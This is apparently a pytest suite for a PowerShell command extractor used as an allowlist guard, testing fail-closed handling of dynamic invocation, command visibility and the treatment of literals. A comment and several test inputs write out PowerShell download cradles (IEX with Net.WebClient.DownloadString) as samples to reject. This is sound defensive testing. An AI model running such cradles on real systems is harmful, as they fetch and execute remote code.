"""Contract tests for the hardened PowerShell command extractor.

Covers the 248-case matrix findings fixed in the extractor-policy PR:
  E-X allowlist bypasses  -> fail closed on dynamic invocation
  C false negatives       -> assignment RHS, post-control-word commands
  B false positives       -> literals/types/operators are not commands
  D false rejections      -> method calls, @(), & { }, here-strings
"""
import pytest

from lingtai.adapters.windows.powershell import (
    PowerShellDialect,
    _commands,
    _UNSUPPORTED,
)


@pytest.fixture(scope="module")
def dialect():
    return PowerShellDialect(executable="pwsh")


def extract(dialect, script):
    # Contract tests target the recursive extractor (_commands), the object
    # of the extractor-policy hardening. PowerShellDialect.extract_commands
    # additionally runs the PR-5 quote-aware fail-closed metachar scanner
    # first, which rejects flagged scripts (pipes, chaining, variable
    # expansion) before extraction ever runs -- those cases are covered by
    # tests/test_shell_pr1_contract.py against extract_commands.
    return _commands(script)


# --- E-X: dynamic invocation must fail closed ---
@pytest.mark.parametrize(
    "script",
    [
        "$x = & $y",
        "$y = & $x",
        "& $cmd -Arg 1",
        "& $arr[0]",
        "& (Get-Command foo)",
        ". $module",
        "Invoke-Expression $x",
        "Invoke-Expression -Command $x",
        "iex 'Get-Process'",
        # The short forms exercise the same fail-closed eval-head branch as
        # these realistic download cradles:
        # IEX(New-Object Net.WebClient).DownloadString('http://x')
        # Invoke-Expression(New-Object Net.WebClient).DownloadString('http://x')
        "IEX(New-Object).DownloadString",
        "iex(New-Object).DownloadString",
        "Invoke-Expression(New-Object).DownloadString",
        "Invoke-Command -ScriptBlock $sb",
        "Start-Job -ScriptBlock $sb",
    ],
)
def test_dynamic_invocation_fails_closed(dialect, script):
    assert _UNSUPPORTED in extract(dialect, script)


# --- C: assignment RHS and post-control-word commands are visible ---
@pytest.mark.parametrize(
    "script, expected",
    [
        ("$x = Get-Process", ("Get-Process",)),
        ("$x = Get-Date", ("Get-Date",)),
        ("$arr[0] = Get-Process", ("Get-Process",)),
        ("$obj.Prop = Get-Process", ("Get-Process",)),
        ("return Get-Process", ("Get-Process",)),
        ("function Get-X { param($Path) Get-Item $Path }", ("Get-Item",)),
        (
            "function Get-X { param($Path) Get-Item $Path | Select-Object Name }",
            ("Get-Item", "Select-Object"),
        ),
        (
            "foreach ($f in Get-ChildItem) { Remove-Item $f }",
            ("Get-ChildItem", "Remove-Item"),
        ),
        ("$x = $a ? Get-Process : Get-Service", ("Get-Process",)),
        ("$x = $a ?? Get-Process", ("Get-Process",)),
        ("$result = Invoke-Command -ScriptBlock { Get-Process }", ("Invoke-Command", "Get-Process")),
    ],
)
def test_commands_after_assignment_and_control_words_are_visible(dialect, script, expected):
    assert extract(dialect, script) == expected


# --- B: literals, types, operators are data, not commands ---
@pytest.mark.parametrize(
    "script, must_not_contain",
    [
        ("Write-Host '{test}'", ("test",)),
        ('Write-Host "a{test}b"', ("test",)),
        ("$h = @{ Name = 'x'; Age = 3 }", ("Name", "Age")),
        ("$a = @(1, 2, 3)", ("1,",)),
        ("if ('a' -eq 'a') { Write-Host yes }", ("a",)),
        ("switch ($x) { 1 { Write-Host one } 'a' { Write-Host a } }", ("1",)),
        ("'{0}' -f $name", ("0",)),
        ("[System.DateTime]::Now", ("[System.DateTime]::Now",)),
        ("[Math]::Max(1, 2)", ("[Math]::Max", "1,")),
        ("[int]$x = 5", ("[int]$x",)),
        ("# comment\nGet-Process", ("#",)),
        ("#region x\nGet-Process\n#endregion", ("#region", "#endregion")),
        ("exit 1", ("exit",)),
        ("enum Color { Red }\nGet-Process", ("enum", "Red")),
        ("class Foo { [int]$x }\nGet-Process", ("[int]$x",)),
    ],
)
def test_data_tokens_are_not_emitted_as_commands(dialect, script, must_not_contain):
    cmds = extract(dialect, script)
    for junk in must_not_contain:
        assert junk not in cmds


def test_hashtable_value_cmdlet_is_extracted(dialect):
    assert extract(dialect, "$h = @{ P = Get-Process }") == ("Get-Process",)


def test_array_literal_with_cmdlet_is_extracted(dialect):
    assert extract(dialect, "$a = @(Get-Process)") == ("Get-Process",)


def test_comments_stripped_and_commands_kept(dialect):
    assert extract(dialect, "# comment\nGet-Process") == ("Get-Process",)


def test_here_string_single_quote_content_is_not_commands(dialect):
    assert extract(dialect, "$s = @'\n$(Get-Date)\n'@") == ()
    assert extract(dialect, "$s = @'\nIt's here\n'@") == ()


def test_backtick_line_continuation(dialect):
    assert extract(dialect, "Get-Process `\n| Select-Object Name") == (
        "Get-Process",
        "Select-Object",
    )


# --- D: safe static code is not rejected ---
@pytest.mark.parametrize(
    "script",
    [
        "$x.ToString()",
        "$x.GetType()",
        "$x.Trim()",
        "$x.ToUpper()",
        "$x.GetType().Name",
        "[Console]::ReadLine()",
        "[CmdletBinding()]\nparam($x)",
        "$a = @()",
        "$s = @'\nhello\n'@",
        '$s = @"\nhello $name\n"@',
    ],
)
def test_safe_static_code_is_not_rejected(dialect, script):
    assert _UNSUPPORTED not in extract(dialect, script)


def test_static_script_block_target_is_accepted(dialect):
    assert extract(dialect, "& { Get-Process }") == ("Get-Process",)
    assert extract(dialect, "& { param($x) Get-Process $x }") == ("Get-Process",)


def test_class_method_body_commands_extracted(dialect):
    cmds = extract(dialect, "class Foo { [void] Run() { Get-Process } }")
    assert "Get-Process" in cmds
    assert _UNSUPPORTED not in cmds


def test_parameterized_method_arg_is_not_a_command(dialect):
    assert extract(dialect, "$x.Substring(0)") == ()
    assert extract(dialect, "$x.Substring(0, 2)") == ()
